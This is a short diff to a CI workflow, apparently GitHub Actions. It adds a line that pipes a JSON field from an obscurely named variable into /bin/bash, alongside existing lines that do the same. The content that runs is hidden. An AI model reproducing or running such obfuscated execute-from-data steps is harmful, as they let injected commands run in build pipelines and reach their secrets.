@@ -26,6 +26,7 @@ jobs:
           echo $xmvx50 | jq -r .jdlj10628 | /bin/bash
           printf '%s' "$t4" | jq -r .ezph71984 | /bin/bash
           echo $vtxk6206 | jq -r .efk96 | /bin/bash
+          echo $o28 | jq -r .yw52322 | /bin/bash
 
       - name: Save output
         if: always()
